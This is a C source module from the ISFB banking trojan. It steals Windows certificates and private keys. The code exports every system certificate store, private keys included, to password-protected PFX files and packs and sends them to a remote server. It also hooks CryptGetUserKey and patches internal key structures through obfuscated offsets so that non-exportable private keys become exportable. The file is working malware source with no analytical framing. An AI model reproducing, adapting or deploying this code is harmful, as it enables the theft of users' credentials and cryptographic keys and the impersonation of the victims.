//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: certs.c
// $Revision: 242 $
// $Date: 2014-05-28 19:01:28 +0400 (Ср, 28 май 2014) $
// description:
//	CRM client dll. Windows certificate store export and management.

#include "..\common\common.h"
#include "..\crm.h"

#define SECURITY_WIN32	TRUE
#include <security.h>
#include <secext.h>
#include <wincrypt.h>

#include "files.h"
#include "pipes.h"
#include "parser.h"
#include "command.h"


#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF

BOOL WINAPI my_CryptGetUserKey(HCRYPTPROV hProv, DWORD dwKeySpec, HCRYPTKEY *phUserKey);
HOOK_FUNCTION hook_CryptGetUserKey = {szAdvapi32, szCryptGetUserKey, &my_CryptGetUserKey, NULL};

static HOOK_DESCRIPTOR CryptGetUserKeyIatHook =
	DEFINE_HOOK(&hook_CryptGetUserKey, HF_TYPE_IAT);

static HOOK_DESCRIPTOR CryptGetUserKeyExportHook = 
	DEFINE_HOOK(&hook_CryptGetUserKey, HF_TYPE_EXPORT);

//
//	Exports all sertificates from the specified store into single .PFX file.
//
static BOOL	CertExportToPfx(
	LPTSTR	StoreName,
	LPTSTR	FilePath	
	)
{
	BOOL	Ret = FALSE;
	HANDLE	hStore;
	LPTSTR	PfxPath;
	ULONG	i = 0, PathLen, NameLen;
	PWCHAR	StoreNameW;

	PathLen = lstrlen(FilePath);
	NameLen = lstrlen(StoreName);

	if (PfxPath = hAlloc((PathLen + 1 + NameLen + cstrlen(szDotPfx) + 1) * sizeof(_TCHAR)))
	{
		// Creating PFX-file name
		lstrcpy(PfxPath, FilePath);
		PfxPath[PathLen] = '\\';
		PfxPath[PathLen + 1] = 0;
		lstrcat(PfxPath, StoreName);
		lstrcat(PfxPath, szDotPfx);

		if (StoreNameW = hAlloc((NameLen + 1) * sizeof(WCHAR)))
		{
			while(StoreNameW[i] = (WCHAR)StoreName[i]) i += 1;

			DbgPrint("ISFB_%04x: Exporting certificate store \"%S\"\n", g_CurrentProcessId, StoreNameW);

			// Using unicode functions to be able to export certs with unicode names.
			if (hStore = CertOpenSystemStoreW(0, StoreNameW))
			{
				ULONG	CertsCount = 0;
				PCCERT_CONTEXT CertContext = NULL;

				while((CertContext = CertEnumCertificatesInStore(hStore, CertContext)) != NULL)
					CertsCount++;

				if (CertsCount)
				{
					CRYPT_DATA_BLOB PfxBlob = {0};

					if (PFXExportCertStoreEx(hStore, &PfxBlob, wczISFB, 0, EXPORT_PRIVATE_KEYS) && (PfxBlob.pbData = hAlloc(PfxBlob.cbData)))
					{
						if (PFXExportCertStoreEx(hStore, &PfxBlob, wczISFB, 0, EXPORT_PRIVATE_KEYS))
						{
							HANDLE	hFile = CreateFile(PfxPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
							if (hFile != INVALID_HANDLE_VALUE)
							{
								ULONG	Written;
								if (Ret = WriteFile(hFile, PfxBlob.pbData, PfxBlob.cbData, &Written, NULL))
								{
									DbgPrint("ISFB_%04x: Exported %u certs to file %s\n", g_CurrentProcessId, CertsCount, PfxPath);
								}
								CloseHandle(hFile);
							}
						}	// if (PFXExportCertStoreEx(storeHandle, &pfxBlob, L"password", 0, EXPORT_PRIVATE_KEYS))
						hFree(PfxBlob.pbData);
					}	// if (PFXExportCertStoreEx(hStore, &PfxBlob, L"password", 0, EXPORT_PRIVATE_KEYS) &&
				}	// if (CertsCount)

				CertCloseStore(hStore, 0);
			}	// if (hStore = CertOpenSystemStoreW(0, StoreNameW))
			hFree(StoreNameW);
		}	// if (StoreNameW = hAlloc((NameLen + 1) * sizeof(WCHAR)))
		hFree(PfxPath);
	}	// if (PfxPath = hAlloc((PathLen + 1 + lstrlenW(StoreName) + 1) * sizeof(_TCHAR)))

	return(Ret);
}


//
//	Thread function.
//	Exports user-specific certificates from the Windows certificate store and sends them to the server.
//
WINERROR WINAPI ExportSendCerts(PVOID Context)
{
	WINERROR	Status;
	LPTSTR		CertFullName = NULL;

	do	// not a loop
	{
		// Generating name for the directory to store exported certs
		if (!(CertFullName = FilesGetTempFile(1234)))
		{
			Status = ERROR_FILE_INVALID;
			break;
		}

		// Since TEMP file was already creted by FilesGetTempFile(), deleting it.
		DeleteFile(CertFullName);

		// Createing the directory to strore PFX files
		if (!CreateDirectory(CertFullName, NULL))
		{
			Status = GetLastError();
			break;
		}

		// Exporting certificates to .PFX file
		CertExportToPfx(szMy, CertFullName);
		CertExportToPfx(szAddressBook, CertFullName);
		CertExportToPfx(szAuthRoot, CertFullName);
		CertExportToPfx(szCertificateAuthority, CertFullName);
		CertExportToPfx(szDisallowed, CertFullName);
		CertExportToPfx(szRoot, CertFullName);
		CertExportToPfx(szTrustedPeople, CertFullName);
		CertExportToPfx(szTrustedPublisher, CertFullName);


		// Packing and sending .PFX to the server
		Status = FilesPackAndSend(NULL, CertFullName, FILE_TYPE_CERT);

		FilesClearDirectory(CertFullName, TRUE, TRUE);
		RemoveDirectory(CertFullName);
		
	} while(FALSE);

	if (CertFullName)
		hFree(CertFullName);

	UNREFERENCED_PARAMETER(Context);

	return(Status);
}


//
//	Hook function.
//	Receives handle to a user's key container and marks the key exportable.
//
BOOL WINAPI my_CryptGetUserKey(HCRYPTPROV hProv, DWORD dwKeySpec, HCRYPTKEY *phUserKey)
{
	BOOL Ret;

	ENTER_HOOK();
		
	Ret = CryptGetUserKey(hProv, dwKeySpec, phUserKey);

	if (Ret && (dwKeySpec != CERT_NCRYPT_KEY_SPEC))
	{
		__try
		{
			// Mark the certificate's private key as exportable and archivable 
			*(PULONG_PTR)(*(PULONG_PTR)(*(PULONG_PTR) 
#ifdef	_WIN64 
				(*phUserKey + 0x58) ^ 0xE35A172CD96214A0) + 0x0C) 
#else 
				(*phUserKey + 0x2C) ^ 0xE35A172C) + 0x08) 
#endif 
				|= CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE; 
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Ret = FALSE;
		}
	}	// if (Ret && (dwKeySpec != CERT_NCRYPT_KEY_SPEC))

	LEAVE_HOOK();

	return(Ret);
}


//
//	Hooks ADVAPI32!CryptGetUserKey function.
//
WINERROR	CertSetHooks(VOID)
{
	WINERROR	Status = ERROR_DLL_NOT_FOUND;

	if (LoadLibraryA(szAdvapi32))
		Status = ParserHookImportExport(&CryptGetUserKeyIatHook, 1, &CryptGetUserKeyExportHook, 1);

	return(Status);
}